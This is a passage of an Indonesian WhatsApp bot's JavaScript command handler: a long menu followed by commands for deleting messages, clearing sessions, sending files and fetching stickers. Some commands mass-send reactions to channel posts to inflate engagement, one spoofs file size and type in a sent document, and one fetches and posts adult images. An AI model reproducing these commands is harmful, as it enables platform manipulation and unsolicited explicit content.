┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ
┗═━═━═━═━═━═━═━═━═━═━═╴
┏━━━━━━『 ʀᴀɴᴅᴏᴍᴀɴɪᴍᴇ 』
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍʙᴀ
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍ-ᴀɴɪᴍᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴡᴏᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʜɪɴᴏʙᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜɪɢʜꜰɪᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀɪɴɢᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴅᴀɴᴄᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀᴘᴘʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢʟᴏᴍᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍᴜɢ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙʟᴜꜱʜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍɪʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡɪɴᴋ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴏɴᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴜʟʟʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʏᴇᴇᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙɪᴛᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʟɪᴄᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪʟʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪꜱꜱ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴜɢ
┃  ❏ ${prefix}ᴄᴏᴜᴘʟᴇᴘᴘ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴀᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʟᴀᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀɪꜰᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴏxɢɪʀʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢ          
┃  ❏ ${prefix}ᴅᴏɢᴡᴏᴏꜰ           
┃  ❏ ${prefix}8ʙᴀʟʟᴘᴏᴏʟ            
┃  ❏ ${prefix}ɢᴏᴏꜱᴇʙɪʀᴅ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴇᴇᴅ            
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ            
┃  ❏ ${prefix}ʟɪᴢᴀʀᴅᴘɪᴄ            
┃  ❏ ${prefix}ᴄᴀᴛᴍᴇᴏᴡ   
┗═━═━═━═━═━═━═━═╴
┏━━━━━━━『 sᴛᴏʀᴇᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴅᴅʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ᴅᴇʟʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ʟɪsᴛʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ᴅᴏɴᴇ
┃  ❏ ${prefix}ᴘʀᴏsᴇs
┃  ❏ ${prefix}ᴊᴘᴍ
┃  ❏ ${prefix}ᴊᴘᴍ2
┃  ❏ ${prefix}ᴊᴘᴍᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴊᴘᴍsʟɪᴅᴇ
┃  ❏ ${prefix}ᴊᴘᴍsʟɪᴅᴇʜᴛ
┃  ❏ ${prefix}ᴊᴘᴍᴄʜ
┃  ❏ ${prefix}ᴊᴘᴍᴄʜғᴏᴛᴏ
┃  ❏ ${prefix}ᴊᴘᴍᴠɪᴅᴇᴏ
┃  ❏ ${prefix}ᴀᴅᴅɪᴅᴄʜ
┃  ❏ ${prefix}ᴅᴇʟɪᴅᴄʜ
┃  ❏ ${prefix}sᴇɴᴅᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ 〕ʙᴜᴛᴛᴏɴ〔
┃  ❏ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ2
┃  ❏ ${prefix}ᴘᴀʏᴍᴇɴᴛ
┃  ❏ ${prefix}ᴘʀᴏᴅᴜᴋ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴄᴠᴘs
┃  ❏ ${prefix}sɪsᴀᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ʀᴇʙᴜɪʟᴅ
┃  ❏ ${prefix}ʀᴇsᴛᴀʀᴛᴠᴘs
┃  ❏ ${prefix}ᴘɪɴɢ
┃  ❏ ${prefix}ᴜᴘᴛɪᴍᴇ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴘᴀɴᴇʟᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴅᴅsᴇʟʟᴇʀ
┃  ❏ ${prefix}ᴅᴇʟsᴇʟʟᴇʀ
┃  ❏ ${prefix}ʟɪsᴛsᴇʟʟᴇʀ
┃  ❏ ${prefix}1ɢʙ
┃  ❏ ${prefix}2ɢʙ
┃  ❏ ${prefix}3ɢʙ
┃  ❏ ${prefix}4ɢʙ
┃  ❏ ${prefix}5ɢʙ
┃  ❏ ${prefix}6ɢʙ
┃  ❏ ${prefix}7ɢʙ
┃  ❏ ${prefix}8ɢʙ
┃  ❏ ${prefix}9ɢʙ
┃  ❏ ${prefix}10ɢʙ
┃  ❏ ${prefix}ᴜɴʟɪᴍɪᴛᴇᴅ
┃  ❏ ${prefix}ᴄᴀᴅᴍɪɴ
┃  ❏ ${prefix}ᴅᴇʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ᴅᴇʟᴀᴅᴍɪɴ
┃  ❏ ${prefix}ʟɪsᴛᴘᴀɴᴇʟ
┃  ❏ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ 
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ɪɴsᴛᴀʟʟᴇʀᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ʜᴀᴄᴋʙᴀᴄᴋᴘᴀɴᴇʟ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀsᴛᴇʟʟᴀʀ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀʙɪʟʟɪɴɢ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀᴇɴɪɢᴍᴀ
┃  ❏ ${prefix}ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 ɢʀᴏᴜᴘᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀɴᴛɪʟɪɴᴋ
┃  ❏ ${prefix}ᴀɴᴛɪʟɪɴᴋ2
┃  ❏ ${prefix}ʙʟᴀᴄᴋʟɪsᴛᴊᴘᴍ
┃  ❏ ${prefix}ᴡᴇʟᴄᴏᴍᴇ
┃  ❏ ${prefix}ᴀᴅᴅ
┃  ❏ ${prefix}ᴋɪᴄᴋ
┃  ❏ ${prefix}ᴄʟᴏsᴇ
┃  ❏ ${prefix}ᴏᴘᴇɴ
┃  ❏ ${prefix}ʜɪᴅᴇᴛᴀɢ
┃  ❏ ${prefix}ᴋᴜᴅᴇᴛᴀɢᴄ
┃  ❏ ${prefix}ʟᴇᴀᴠᴇ
┃  ❏ ${prefix}ᴛᴀɢᴀʟʟ
┃  ❏ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
┃  ❏ ${prefix}ᴅᴇᴍᴏᴛᴇ
┃  ❏ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┃  ❏ ${prefix}ʟɪɴᴋɢᴄ
┃  ❏ ${prefix}sᴇɴᴅᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴜɴʙʟᴏᴋ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴏᴡɴᴇʀᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴜᴛᴏʀᴇᴀᴅ
┃  ❏ ${prefix}ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ
┃  ❏ ${prefix}ᴀᴜᴛᴏʀᴇᴀᴅsᴡ
┃  ❏ ${prefix}ᴀᴜᴛᴏᴛʏᴘɪɴɢ
┃  ❏ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┃  ❏ ${prefix}ʟɪsᴛᴏᴡɴᴇʀ
┃  ❏ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┃  ❏ ${prefix}ᴘʀɪᴠᴀᴛ/ᴘᴜʙʟɪᴄ
┃  ❏ ${prefix}sᴜʙᴅᴏᴍᴀɪɴ
┃  ❏ ${prefix}sᴇᴛɪᴍɢᴍᴇɴᴜ
┃  ❏ ${prefix}sᴇᴛɪᴍɢғᴀᴋᴇ
┃  ❏ ${prefix}sᴇᴛᴘᴘʙᴏᴛ
┃  ❏ ${prefix}ᴄʟᴇᴀʀsᴇssɪᴏɴ
┃  ❏ ${prefix}ᴄʟᴇᴀʀᴄʜᴀᴛ
┃  ❏ ${prefix}ʀᴇsᴇᴛᴅʙ
┃  ❏ ${prefix}ʀᴇsᴛᴀʀᴛʙᴏᴛ
┃  ❏ ${prefix}ɢᴇᴛsᴄ
┃  ❏ ${prefix}ɢᴇᴛᴄᴀsᴇ
┃  ❏ ${prefix}ʟɪsᴛɢᴄ
┃  ❏ ${prefix}ᴊᴏɪɴɢᴄ
┃  ❏ ${prefix}ᴊᴏɪɴᴄʜ
┃  ❏ ${prefix}ᴜᴘᴄʜᴀɴɴᴇʟ
┃  ❏ ${prefix}ᴜᴘᴄʜᴀɴɴᴇʟ2
┃  ❏ ${prefix}ᴀᴍʙɪʟǫ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴛᴇxᴛᴜɴʙᴀɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ3 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ4 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ5 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ6 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ7 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ8 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ9 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ10 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ11 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ12 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ13 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ14 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ15 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ16 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ17 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ18  
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ19 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ20 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ21 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ3
┗═━═━═━═━═━═━═━═━═╴
┏━『 ᴘᴀʏᴍᴇɴᴍᴇɴᴜ ☣︎ 』━━☯
┃  ❏ ${prefix}ᴅᴀɴᴀ
┃  ❏ ${prefix}ᴏᴠᴏ
┃  ❏ ${prefix}ɢᴏᴘᴀʏ
┃  ❏ ${prefix}sʜᴏᴘᴇᴘᴀʏ
╰━━━━━━━━━━━━━━━━━━━☯   `
await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'contact owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'entahlah',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Credit script',
                  id: '.putzz-tqto'
                },         
                {
                  title: 'Script bot free',
                  id: '.scfree'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("../package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 999999999999999999999999999999999999999999999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: ppmenu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case 'kirimzip': {
  const rawr = './source/media/script1.zip' // Ganti dengan path file ZIP kamu
  const caption = 'Berikut adalah file ZIP yang diminta:'

  if (!fs.existsSync(rawr)) {
    return Putzz.sendMessage(m.chat, { text: 'File tidak ditemukan!' }, { quoted: m })
  }

  await Putzz.sendMessage(m.chat, {
    document: fs.readFileSync(rawr),
    mimetype: 'application/zip',
    fileName: 'Lanz Kw.zip',
    caption: caption,
  }, { quoted: m })

  break
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (!m.quoted) return ReplyLanz("reply pesannya")
if (m.quoted.fromMe) {
Putzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
Putzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return ReplyLanz(mess.owner)
if (!m.quoted) return ReplyLanz(example("reply pesan"))
Putzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
ReplyLanz(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'f☺☺': {
  // .rch [count] <emoji1,emoji2,...>
  // Accepts either: reply to forwarded channel message OR direct link:
  // .rch https://whatsapp.com/channel/0029Van6ItnIyPtYQU3k0z3s/2687 🗿,👍
  if (!isCreator) return ReplyLanz('❗ *Hanya creator yang dapat menggunakan perintah ini.*');
  if (!text) return ReplyLanz('.rch <count?> <emoji1,emoji2,...> atau .rch <link> <emoji1,emoji2,...>\nContoh: .rch 10 🗿,👍  atau  .rch https://whatsapp.com/channel/.../2687 🗿,👍');

  try {
    // parse leading count optionally
    let parts = text.trim().split(/\s+/);
    let maybeCount = Number(parts[0]);
    let count = 1;
    if (!Number.isNaN(maybeCount) && maybeCount > 0) {
      count = maybeCount;
      parts.shift();
    }
    const restText = parts.join(' ').trim();
    if (!restText) return ReplyLanz('❗ Masukkan link atau emoji. Contoh: .rch https://.../2687 🗿,👍');

    // detect if first token is a link
    const firstToken = restText.split(/\s+/)[0];
    const linkMatch = firstToken.match(/https?:\/\/(?:www\.)?whatsapp\.com\/channel\/([^\/\s]+)\/([^\/\s]+)/i);

    // prepare emojis part (remove link if present)
    let emojisPart = restText;
    if (linkMatch) {
      emojisPart = restText.slice(firstToken.length).trim();
    }

    // clean trailing casual words
    emojisPart = emojisPart.replace(/[a-zA-Z]+\s*$/g, '').trim();
    if (!emojisPart) return ReplyLanz('❗ Masukkan emoji setelah link. Contoh: .rch https://.../2687 🗿,👍');

    // parse emojis (comma preferred)
    let tokens = emojisPart.includes(',') ? emojisPart.split(',') : emojisPart.split(/\s+/);
    const emojis = [];
    for (const t of tokens.map(x=>x.trim()).filter(Boolean)) {
      // try modern unicode emoji extraction
      let found = null;
      try { found = t.match(/\p{Emoji_Presentation}|\p{Emoji}\uFE0F|\p{Emoji}/gu); } catch(e){}
      if (found && found.length) { found.forEach(u=>{ if(!emojis.includes(u)) emojis.push(u); }); continue; }

      // fallback surrogate pairs
      const sur = t.match(/([\uD800-\uDBFF][\uDC00-\uDFFF])/g);
      if (sur && sur.length) { sur.forEach(s=>{ if(!emojis.includes(s)) emojis.push(s); }); continue; }

      // last resort: non-ascii chars
      const stripped = t.replace(/[A-Za-z0-9\s\-\_\.\,]/g,'').trim();
      if (stripped) Array.from(stripped).forEach(c=>{ if(!emojis.includes(c)) emojis.push(c); });
    }

    if (emojis.length === 0) return ReplyLanz('❗ Tidak menemukan emoji valid. Contoh: .rch https://.../2687 🗿,👍');

    // Safety caps & distribution
    const MAX_TOTAL = 200;
    const totalRequested = Math.min(MAX_TOTAL, Math.max(1, count * emojis.length));
    const perEmojiCount = Math.max(1, Math.floor(totalRequested / emojis.length));

    // Determine target: prefer m.quoted (most reliable), else try link heuristics
    let remoteJid = null;
    let messageId = null;
    let usedSource = null;

    if (m.quoted && m.quoted.key) {
      // use quoted message key (recommended)
      const qk = m.quoted.key;
      remoteJid = qk.remoteJid || qk.participant || null;
      messageId = qk.id || qk._serialized || null;
      usedSource = 'quoted';
    } else if (linkMatch) {
      // parse channelId & msgId from link
      const channelId = linkMatch[1]; // e.g. 0029Van6ItnIyPtYQU3k0z3s
      const linkMsgId = linkMatch[2]; // e.g. 2687
      // Heuristics: try several plausible remoteJid/messageId forms
      // NOTE: these are heuristics — may fail if bot has no access or format differs.
      const candidates = [];

      // common attempt: channelId@broadcast (some implementations)
      candidates.push({ rjid: `${channelId}@broadcast`, mid: linkMsgId });
      // try with domain s.whatsapp.net (possible)
      candidates.push({ rjid: `${channelId}@s.whatsapp.net`, mid: linkMsgId });
      // try wamid-like id (if linkMsgId numeric, create wamid placeholder)
      candidates.push({ rjid: `${channelId}@broadcast`, mid: `wamid.${linkMsgId}` });
      // try raw link id as mid
      candidates.push({ rjid: `${channelId}@broadcast`, mid: `${channelId}-${linkMsgId}` });

      // pick first candidate that works (we'll test by trying to send a single reaction with trial mode)
      usedSource = 'link';
      // store candidates to try later
      var linkCandidates = candidates;
    } else {
      return ReplyLanz('❗ Tidak menemukan quoted message atau link. Silakan reply forwarded channel message (recommended) atau berikan link channel + emoji.');
    }

    await ReplyLanz(`⏳ Memulai reaction... Sumber: ${usedSource === 'quoted' ? 'quoted message' : 'link'}\nEmoji: ${emojis.join(' ')}\nPer-emoji: ${perEmojiCount} (total ≈ ${perEmojiCount * emojis.length})`);

    // helper: try send single reaction via conn; tries multiple payloads
    async function trySendReactSingle(rjid, mid, emoji) {
      const key = { remoteJid: rjid, id: mid, fromMe: false };
      // try react payload
      try {
        await conn.sendMessage(rjid, { react: { text: emoji, key } });
        return true;
      } catch (e) {}
      try {
        await conn.sendMessage(rjid, { reactionMessage: { text: emoji, key } });
        return true;
      } catch (e) {}
      try {
        // fallback: quoted text (may not count as reaction)
        await conn.sendMessage(rjid, { text: emoji }, { quoted: { key } });
        return true;
      } catch (e) {}
      return false;
    }

    // If using link, try candidates to find one that accepts a single test react
    if (usedSource === 'link') {
      let found = false;
      for (const c of linkCandidates) {
        try {
          // Try a single test react with short timeout; if success, use this candidate
          const ok = await trySendReactSingle(c.rjid, c.mid, emojis[0]);
          if (ok) {
            remoteJid = c.rjid;
            messageId = c.mid;
            found = true;
            // we sent one reaction already; it's okay - count will include it.
            break;
          }
        } catch (e) {
          // ignore, try next
        }
      }
      if (!found) {
        // couldn't find a usable candidate
        return ReplyLanz('⚠️ Gagal mengakses pesan via link. Pastikan bot punya akses ke channel atau forward pesan channel ke grup lalu reply perintah ini.\nCara yang paling andal: forward pesan channel ke grup dan gunakan .rch sambil reply forwarded message.');
      }
    }

    // Now we have remoteJid & messageId (hopefully)
    if (!remoteJid || !messageId) {
      return ReplyLanz('❗ Gagal mendapatkan target message yang valid. Silakan forward pesan channel ke grup dan reply perintah ini sebagai fallback.');
    }

    // send reactions with throttle
    const DELAY_MS = 300;
    let sentCount = 0;
    for (const emo of emojis) {
      for (let i = 0; i < perEmojiCount; i++) {
        const ok = await trySendReactSingle(remoteJid, messageId, emo);
        if (!ok) {
          // when the first fails, likely not permitted — abort and inform user
          if (sentCount === 0) {
            return ReplyLanz('⚠️ Gagal mengirim reaction — kemungkinan bot tidak punya akses ke pesan tersebut atau protocol tidak mendukung reaction. Silakan forward pesan dan coba lagi.');
          } else {
            // partial failures allowed; continue
            console.error('partial failure sending react', emo);
          }
        } else sentCount++;
        await new Promise(r => setTimeout(r, DELAY_MS));
      }
    }

    await ReplyLanz(`✅ Selesai. Reaction terkirim (perkiraan): ${sentCount} actions.`);

  } catch (err) {
    console.error('Error case rch (link support):', err);
    return ReplyLanz('❌ Terjadi kesalahan saat menjalankan .rch. Pastikan format benar atau gunakan metode forward+reply.');
  }
}
break;

case 'telestick':
  case 'stickertele':
     case 'stele':{
     async function hozaz() {
     const { Telesticker } = require('../library/scrape-telesticker.js')
         if (args.length == 0) return ReplyLanz(`mana url nya? contoh : ${command} https://t.me/addstickers/bocchi_ryo_y0ursfunny_akaudon`); 
         if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {              
             let res = await Telesticker(args[0]);         
             await reaksi('⚡');    
                 
                   for (let i = 0; i < res.length; i++) {
                            await new Promise(resolve => setTimeout(resolve, 3000)); // tunggu 0,5 detik
                        await Putzz.sendAsSticker(m.sender, res[i].url, m, { 
                           packname: 'Tele stickerPack', 
                           author: 'Confert By Mikasa MD' });
             }}
             
           }
           await hozaz()
           await reaksi('✅');
       }
       break;
case 'react':
case 'rch': {
    if (!text) return ReplyLanz(`Contoh:\n.rch https://whatsapp.com/channel/xxxx/1234 😂`);

    let [url, ...emoji] = text.split(" ");
    emoji = emoji.join(" ").trim();

    if (!url || !emoji) return ReplyLanz(`Format salah!\nContoh:\n.rch https://whatsapp.com/channel/xxxx/1234 😂`);

    const apiUrl = `https://api-faa.my.id/faa/react-channel?url=${encodeURIComponent(url)}&react=${encodeURIComponent(emoji)}`;

    try {
        const fetch = (await import("node-fetch")).default;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json.status) return ReplyLanz(`Gagal: ${json.message || 'Unknown error'}`);

        let teks = `*SUKSES REACT CHANNEL*\n`;
        teks += `• Emoji: ${json.info.reaction_used}\n`;
        teks += `• Tujuan: ${json.info.destination}`;

        ReplyLanz(teks);
    } catch (e) {
        console.error(e);
        ReplyLanz(`Terjadi kesalahan pada server`);
    }
}
break;
case "h":
case "rgch": {
 //   if (!isOwner) return ReplyLanz(mes.Owner);
    if (!text) return ReplyLanz("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️Putzz\n.reactch https://whatsapp.com/channel/xxx/123 ❤️Putzz|5");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const [mainText, offsetStr] = text.split('|');
    const argsa = mainText.trim().split(" ");
    const link = argsa[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return ReplyLanz("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️Putzz|3");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return ReplyLanz("Link tidak lengkap!");
    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = argsa.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();
    if (!teksTanpaLink) return ReplyLanz("Masukkan teks/emoji untuk direaksikan.");
    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
        if (c === ' ') return '◡';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const metadata = await Putzz.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await Putzz.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        ReplyLanz(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
    } catch (err) {
        console.error(err);
        ReplyLanz("❌ Gagal memproses permintaan!");
    }
}
break

case 'pixhentai': case 'pix': {
  if (!qmsg) return ReplyLanz('Masukkan judul yang mau dicari!\nContoh: pixhentai guru');

  let res = await fetch(`https://api.crafters.biz.id/manga/pixhentai?text=${encodeURIComponent(q)}`);
  if (!res.ok) return ReplyLanz('Gagal mengambil data dari API.');
  let json = await res.json();
  if (!json.status || !json.result || !json.result.length) return ReplyLanz('Tidak ditemukan hasil untuk pencarianmu.');
  let hasil = json.result[0]; 
  let teks = `*Judul:* ${hasil.title}\n*Link:* ${hasil.link}\n\nTotal gambar: ${hasil.images.length}`;
  
  await Putzz.sendMessage(m.chat, {
    image: { url: hasil.thumbnail },
    caption: teks
  }, { quoted: m });
  for (let img of hasil.images) {
    await delay(1000); 
    await Putzz.sendMessage(m.chat, {
      image: { url: img }
    }, { quoted: m });
  }
}
break
case "manim": case "menuanime": case "animemenu":{
let anime = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

